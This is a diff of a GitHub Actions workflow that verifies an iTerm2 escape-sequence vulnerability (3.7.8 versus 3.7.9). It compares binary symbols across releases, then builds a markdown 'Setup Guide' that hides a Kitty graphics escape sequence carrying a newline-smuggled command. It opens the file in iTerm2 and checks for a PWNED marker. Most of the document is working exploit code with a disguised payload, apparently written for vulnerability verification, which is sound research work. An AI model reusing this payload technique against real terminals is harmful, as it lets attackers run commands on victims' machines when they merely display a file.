@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       version:
-        description: 'iTerm2 version (3.7.8 vulnerable, 3.7.9 fixed)'
+        description: 'iTerm2 version'
         required: true
         default: '3.7.8'
       mode:
@@ -17,21 +17,103 @@ on:
           - direct
 
 jobs:
-  verify:
-    runs-on: macos-13
+
+  # ============================================================
+  # Job A: 二进制符号对比（ubuntu，秒级完成）
+  # 不需要 macOS —— strings 只是字节扫描
+  # ============================================================
+  symbols:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - name: System
+        run: |
+          uname -a
+          python3 --version
+
+      - name: Download both versions
+        run: |
+          set -eux
+          for V in 3_7_8 3_7_9; do
+            echo "=== downloading $V ==="
+            curl -sL --max-time 300 -o "/tmp/$V.zip" \
+              "https://iterm2.com/downloads/stable/iTerm2-$V.zip"
+            ls -la "/tmp/$V.zip"
+          done
+
+      - name: Extract
+        run: |
+          set -eux
+          for V in 3_7_8 3_7_9; do
+            mkdir -p "/tmp/x/$V"
+            unzip -q "/tmp/$V.zip" -d "/tmp/x/$V" || echo "unzip failed for $V"
+            echo "=== $V contents ==="
+            find "/tmp/x/$V" -maxdepth 3 -type f | head -10
+          done
+
+      - name: Compare symbols
+        run: |
+          echo "=============================================================="
+          echo "BINARY SYMBOL COMPARISON (real, from official releases)"
+          echo "=============================================================="
+
+          for V in 3_7_8 3_7_9; do
+            BIN="/tmp/x/$V/iTerm.app/Contents/MacOS/iTerm2"
+            if [ ! -f "$BIN" ]; then
+              echo "MISSING: $BIN"
+              continue
+            fi
+            echo ""
+            echo "--- iTerm2 $V  ($(stat -c%s "$BIN") bytes) ---"
+            for SYM in \
+              it_reportUnsafeControlCharacterSet \
+              stringByReplacingControlCharactersWithSpace \
+              sanitizedResponseMessage \
+              executeAPC \
+              respondToTransmit \
+              filenameIsSafe \
+              resourceValues \
+              localizedDescription \
+              screenSendReportData \
+              EBADF
+            do
+              C=$(strings -a "$BIN" | grep -c -- "$SYM" || true)
+              printf "  %-46s %s\n" "$SYM" "$C"
+            done
+          done
+
+      - name: Diff the two binaries
+        run: |
+          B1="/tmp/x/3_7_8/iTerm.app/Contents/MacOS/iTerm2"
+          B2="/tmp/x/3_7_9/iTerm.app/Contents/MacOS/iTerm2"
+          if [ -f "$B1" ] && [ -f "$B2" ]; then
+            echo "=== sizes ==="
+            stat -c%s "$B1" "$B2"
+            echo ""
+            echo "=== sha256 ==="
+            sha256sum "$B1" "$B2"
+            echo ""
+            echo "=== symbols present in 3.7.9 but not 3.7.8 ==="
+            strings -a "$B1" | sort -u > /tmp/s8.txt
+            strings -a "$B2" | sort -u > /tmp/s9.txt
+            comm -13 /tmp/s8.txt /tmp/s9.txt | grep -iE "control|sanitiz|report|kitty" | head -30 || true
+          fi
+
+  # ============================================================
+  # Job B: 真实 iTerm2 测试（macOS）
+  # ============================================================
+  macos-test:
+    runs-on: macos-14
     timeout-minutes: 25
+    needs: symbols
 
     steps:
       - name: Environment
         run: |
-          echo "=== System ==="
           sw_vers
-          uname -a
-          echo ""
-          echo "=== Console user ==="
+          uname -m
           stat -f%Su /dev/console
-          echo ""
-          echo "=== WindowServer ==="
           pgrep -l WindowServer || echo "no WindowServer"
 
       - name: Download iTerm2
@@ -40,27 +122,12 @@ jobs:
         run: |
           set -eux
           V=$(echo "$VER" | tr '.' '_')
-          URL="https://iterm2.com/downloads/stable/iTerm2-${V}.zip"
-          curl -L --max-time 300 -o /tmp/i.zip "$URL"
-          ls -la /tmp/i.zip
+          curl -L --max-time 300 -o /tmp/i.zip \
+            "https://iterm2.com/downloads/stable/iTerm2-${V}.zip"
           unzip -q /tmp/i.zip -d /tmp/i
           xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
-          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
-
-      - name: Check binary symbols
-        run: |
-          BIN="/tmp/i/iTerm.app/Contents/MacOS/iTerm2"
-          echo "=== fixed symbols (3.7.9 only) ==="
-          for sym in it_reportUnsafeControlCharacterSet stringByReplacingControlCharactersWithSpace; do
-            C=$(strings -a "$BIN" | grep -c "$sym" || true)
-            echo "  $sym = $C"
-          done
-          echo ""
-          echo "=== baseline symbols ==="
-          for sym in executeAPC respondToTransmit filenameIsSafe screenSendReportData; do
-            C=$(strings -a "$BIN" | grep -c "$sym" || true)
-            echo "  $sym = $C"
-          done
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" \
+            /tmp/i/iTerm.app/Contents/Info.plist
 
       - name: Build payload
         run: |
@@ -69,27 +136,21 @@ jobs:
           FP=$(printf '/tmp/x\n%s\nz' "$CMD")
           B64=$(printf '%s' "$FP" | base64)
           ESC=$(printf '\033')
-          printf '# Setup Guide\n\n## Prerequisites\n- Node.js 18+\n%s_Ga=T,f=100,t=f,i=1;%s%s\\\n## Install\nnpm install\n' "$ESC" "$B64" "$ESC" > /tmp/payload.md
-          echo "=== size ==="
+          printf '# Setup Guide\n\n## Prerequisites\n- Node.js 18+\n%s_Ga=T,f=100,t=f,i=1;%s%s\\\n## Install\nnpm install\n' \
+            "$ESC" "$B64" "$ESC" > /tmp/payload.md
           wc -c /tmp/payload.md
-          echo "=== hexdump ==="
-          od -c /tmp/payload.md | head -20
+          od -c /tmp/payload.md | head -15
 
-      - name: Clean marker
-        run: |
-          rm -f "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2
-          echo cleaned
+      - name: Clean
+        run: rm -f "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2
 
-      - name: Launch iTerm2 and feed payload
-        env:
-          MODE: ${{ inputs.mode }}
+      - name: Launch iTerm2
         run: |
           set -x
           open -a /tmp/i/iTerm.app
           sleep 12
-          pgrep -l iTerm || echo "iTerm not running"
-
-          cat > /tmp/drive.scpt <<'SCPT'
+          pgrep -l iTerm || echo "NOT RUNNING"
+          cat > /tmp/d.scpt <<'SCPT'
           tell application "iTerm2"
             activate
             delay 3
@@ -101,48 +162,35 @@ jobs:
             delay 6
           end tell
           SCPT
-
-          osascript /tmp/drive.scpt 2>&1 || echo "osascript failed"
+          osascript /tmp/d.scpt 2>&1 || echo "osascript failed"
           sleep 10
-          pgrep -l iTerm || echo "iTerm gone"
 
-      - name: Check result
+      - name: Result
         if: always()
         run: |
-          echo "================================================"
-          echo "RESULT CHECK"
-          echo "================================================"
+          echo "=============================================="
           FOUND=0
-          for f in "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2 ./PWNED_ITERM2; do
+          for f in "$HOME/PWNED_ITERM2" /tmp/PWNED_ITERM2; do
             if [ -f "$f" ]; then
-              echo "[RESULT] VULNERABLE - marker found: $f"
+              echo "[RESULT] VULNERABLE: $f"
               ls -la "$f"
               FOUND=1
             fi
           done
-          if [ "$FOUND" = "0" ]; then
-            echo "[RESULT] NOT_EXPLOITED"
-            echo ""
-            echo "=== pwd ==="
-            pwd
-            echo "=== HOME ==="
-            ls -lat "$HOME" | head -20
-            echo "=== /tmp ==="
-            ls -lat /tmp | head -20
-          fi
+          [ "$FOUND" = "0" ] && echo "[RESULT] NOT_EXPLOITED"
+          echo "=============================================="
+          pwd; ls -lat "$HOME" | head -15
 
       - name: Screenshot
         if: always()
-        run: |
-          screencapture -x /tmp/screen.png 2>/dev/null && echo "captured" || echo "capture failed"
-          ls -la /tmp/screen.png 2>/dev/null || true
+        run: screencapture -x /tmp/s.png 2>/dev/null || true
 
-      - name: Upload evidence
+      - name: Upload
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: evidence
+          name: macos-evidence
           path: |
             /tmp/payload.md
-            /tmp/screen.png
+            /tmp/s.png
           if-no-files-found: warn
